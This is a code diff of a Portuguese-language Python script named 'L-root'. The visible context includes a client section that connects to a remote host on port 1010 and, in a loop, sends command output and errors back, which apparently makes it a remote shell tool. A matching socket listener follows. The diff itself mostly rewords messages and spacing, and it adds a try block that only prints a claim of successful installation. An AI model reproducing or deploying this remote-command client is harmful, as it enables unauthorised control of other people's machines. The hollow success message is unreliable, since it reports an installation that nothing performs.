@@ -12,11 +12,15 @@ MIN_PYTHON = ("3.6.9")  # Versão mínima do Python exigida
 MIN_PYTHON_VERSION = tuple(map(int, MIN_PYTHON.split(".")))
 
 if sys.version_info < MIN_PYTHON_VERSION:
-    print(f"A instalação do L-root será interrompida porque a versão mínima do Python exigida é {MIN_PYTHON[0]}. ou superior. Você está executando o Python {sys.version}. Você pode instalar a versão Python compatível manualmente.")
+    print(f"A instalação do L-root foi interrompida porque a versão mínima do Python exigida é {MIN_PYTHON[0]}. ou superior. Você está executando o Python {sys.version}. Você pode instalar a versão Python compatível manualmente.")
     sys.exit(1)
 else:
     print("[+] Versão compatível do Python detectada. Continuando a instalação...")
-
+    try:
+        print("[+] instalaçâo do L-root foi feita com sucesso")
+    except Exception as e:
+        print(f"[-]Erro: ocorreu um erro na instalação do L-root, Erro {e}]")
+        sys.exit(1)
 
 black='\033[0;90m'
 red='\033[0;91m'
@@ -172,7 +176,7 @@ else:
     # código para executar se o usuário estiver incorreto
     exit()
 
-#cliente
+# cliente
 REMOTE_HOST = ''
 REMOTE_PORT = 1010
 
@@ -193,17 +197,21 @@ while True:
     print("[-] mandando resposta...")
     client.send(output + output_error)
 
-#servidor socket
+# servidor socket
+
 HOST = '127.0.0.1'  # endereço do servidor (em branco significa que irá usar o endereço local)
 PORT = 1010  # porta de conexão
 
 # cria um socket TCP
+
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # vincula o socket com o endereço e porta
+
 server_socket.bind((HOST, PORT))
 
 # define o número máximo de conexões pendentes
+
 server_socket.listen(1)
 
 print('Aguardando conexão...')
